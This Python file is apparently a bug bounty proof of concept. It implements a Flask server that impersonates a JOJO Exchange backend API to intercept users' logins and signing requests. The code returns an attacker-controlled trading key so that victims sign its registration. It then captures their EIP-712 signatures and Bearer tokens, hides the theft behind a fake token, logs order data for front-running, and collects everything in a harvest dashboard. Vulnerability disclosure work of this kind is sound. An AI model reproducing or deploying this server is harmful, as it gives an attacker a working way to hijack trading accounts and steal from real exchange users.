#!/usr/bin/env python3
"""
F2 PoC — Step 2: Malicious Heroku server that would be deployed to
    jojo-api-mainnet-0da296028aeb.herokuapp.com

This server demonstrates how an attacker intercepts ALL authentication and
signing operations from production JOJO Exchange users.

IMPORTANT: This code is for bug bounty demonstration only.
           Do NOT deploy to the actual Heroku app name.
           Do NOT use against real users.

To test locally:
    pip install flask requests eth_account
    python3 malicious_heroku_server.py
    # Then open browser to http://localhost:5000
"""

from flask import Flask, request, jsonify, g
from eth_account import Account
from eth_account.messages import encode_defunct
import json
import time
import logging
import secrets

logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s %(message)s')
log = logging.getLogger("malicious-jojo")

app = Flask(__name__)

# ── Attacker-generated Orderly keypair ──────────────────────────────────────
# In a real attack, attacker generates a real Ed25519 orderly keypair.
# When returned via /temporary/orderlyKey, this key gets registered on-chain
# for every victim who logs in.
ATTACKER_ORDERLY_PRIVATE_KEY = secrets.token_hex(32)  # placeholder
ATTACKER_ORDERLY_PUBLIC_KEY  = "ed25519:ATTACKER_CONTROLLED_KEY_AAAAAAAAAAAAAAAAAAA"

# ── Storage (in-memory, real attacker would use a DB) ────────────────────────
HARVESTED_DATA = []

def harvest(event_type, data):
    entry = {"time": time.time(), "type": event_type, "data": data,
             "ip": request.remote_addr, "ua": request.headers.get("User-Agent","")}
    HARVESTED_DATA.append(entry)
    log.info(f"[HARVESTED] {event_type}: {json.dumps(data)[:200]}")
    return entry


# ── Middleware: log all incoming requests ─────────────────────────────────────
@app.before_request
def log_request():
    harvest("raw_request", {
        "method": request.method,
        "path": request.path,
        "headers": dict(request.headers),
        "body": request.get_data(as_text=True)[:2000],
    })


# ── /v2/serverTime — needed during login flow ──────────────────────────────
@app.route("/v2/serverTime", methods=["GET"])
def server_time():
    return jsonify({"success": True, "data": {"serverTime": int(time.time() * 1000)}})


# ── /v2/temporary/orderlyKey — CRITICAL: return attacker's key ──────────────
@app.route("/v2/temporary/orderlyKey", methods=["POST"])
def temporary_orderly_key():
    """
    In the legitimate server, this returns the user's orderly public key.
    Here, we return the ATTACKER's public key instead.
    The frontend will build an EIP-712 message using this key.
    The user signs it with MetaMask, registering the attacker's key on-chain.
    """
    auth_token = request.headers.get("Authorization", "")
    wallet     = request.headers.get("orderly-account-address", "")
    chain_id   = request.headers.get("orderly-account-id", "")

    harvest("orderly_key_request", {
        "wallet": wallet,
        "chain_id": chain_id,
        "auth_token": auth_token,   # ← 7-day Bearer token if user was already logged in
    })

    log.warning(f"[ATTACK] Returning attacker orderly key to {wallet}")
    return jsonify({
        "success": True,
        "data": {
            "orderlyKey": ATTACKER_ORDERLY_PUBLIC_KEY
            # Victim will now sign EIP-712: "Register key ATTACKER_PUBLIC_KEY for my account"
        }
    })


# ── /v2/authToken — receives MetaMask signature + registers key on-chain ─────
@app.route("/v2/authToken", methods=["POST"])
def auth_token():
    """
    Receives:
        {message: {brokerId, chainId, orderlyKey, scope, timestamp, expiration},
         signature: "0x...",        # EIP-712 signature from user's MetaMask
         userAddress: "0x...",
         referralCode: "..."}

    The 'orderlyKey' in message is the attacker's key (from /temporary/orderlyKey).
    The 'signature' is the user's valid MetaMask signature over the attacker's key.

    Attacker action:
    1. Log all data (signature + key = on-chain registration proof)
    2. Optionally submit the registration on-chain using the captured signature
    3. Return a fake Bearer token so the user doesn't notice anything wrong
    """
    body = request.get_json(silent=True) or {}
    message   = body.get("message", {})
    signature = body.get("signature", "")
    wallet    = body.get("userAddress", "")

    harvest("auth_token_request", {
        "wallet": wallet,
        "orderly_key_being_registered": message.get("orderlyKey", ""),
        "scope": message.get("scope", ""),
        "expiration_ms": message.get("expiration", 0),
        "eip712_signature": signature,
        "full_message": message,
    })

    # CRITICAL: attacker now has:
    #   - wallet: victim's address
    #   - signature: valid MetaMask EIP-712 signature over attacker's orderly key
    #   - scope: "read,trading" — full trading access
    #   This signature can be submitted to Orderly on-chain to register the
    #   attacker's key as an authorized trading key for the victim's account.

    log.warning(
        f"[ATTACK] EIP-712 SIGNATURE CAPTURED for {wallet}\n"
        f"         Key being registered: {message.get('orderlyKey','')}\n"
        f"         Scope: {message.get('scope','')}\n"
        f"         Signature: {signature[:40]}..."
    )

    # Issue a fake Bearer token (user thinks login succeeded)
    fake_token = f"fake_bearer_{secrets.token_hex(16)}"
    return jsonify({
        "success": True,
        "data": {
            "token": fake_token,    # Fake but functional-looking token
            "userId": wallet,
        }
    })


# ── /v2/private/signature — server-side signing oracle ───────────────────────
@app.route("/v2/private/signature", methods=["POST"])
def private_signature():
    """
    The frontend sends the string it wants signed with the Orderly private key.
    Format: f"{timestamp}{METHOD}{path}{body_json}"
    Example: "1718000000000POST/v1/order{"symbol":"BTC-PERP","side":"BUY","size":"0.1"}"

    This is the signing oracle — the Heroku server holds the private key.
    An attacker can:
    1. Log all strings (reveals all pending order parameters for front-running)
    2. Sign a different string (order manipulation)
    3. Refuse to sign (DoS)
    """
    string_to_sign = request.get_data(as_text=True)

    harvest("signing_oracle_request", {
        "string_to_sign": string_to_sign,  # Contains full order parameters!
        "auth_token": request.headers.get("Authorization", ""),
        "wallet": request.headers.get("orderly-account-address", ""),
    })

    # Parse what's being signed for logging
    if string_to_sign:
        log.warning(f"[FRONT-RUN DATA] Signing request: {string_to_sign[:200]}")

    # Return a garbage signature (causes user's Orderly API call to fail)
    # Real attacker would sign with registered attacker key for their own orders
    return jsonify({
        "success": True,
        "data": {
            "signature": "0x" + "a" * 128  # Invalid — causes downstream failure
        }
    })


# ── Catch-all: proxy all other requests through (transparent) ─────────────────
@app.route("/v2/<path:subpath>", methods=["GET", "POST", "PUT", "DELETE", "PATCH"])
def catch_all(subpath):
    """Log everything else and return empty success."""
    harvest("other_request", {"path": f"/v2/{subpath}"})
    return jsonify({"success": True, "data": {}})


# ── /harvested — attacker dashboard showing all captured data ─────────────────
@app.route("/harvested")
def show_harvested():
    return jsonify({
        "total_events": len(HARVESTED_DATA),
        "events": HARVESTED_DATA[-50:]  # last 50
    })


if __name__ == "__main__":
    print("=" * 70)
    print("Malicious JOJO Heroku Server (PoC — LOCAL ONLY)")
    print("=" * 70)
    print(f"Attacker orderly key: {ATTACKER_ORDERLY_PUBLIC_KEY}")
    print("Endpoints ready:")
    print("  POST /v2/temporary/orderlyKey  — returns attacker's key")
    print("  POST /v2/authToken             — captures EIP-712 signatures")
    print("  POST /v2/private/signature     — signing oracle (logs all orders)")
    print("  GET  /harvested               — attacker dashboard")
    print("=" * 70)
    app.run(host="0.0.0.0", port=5000, debug=False)
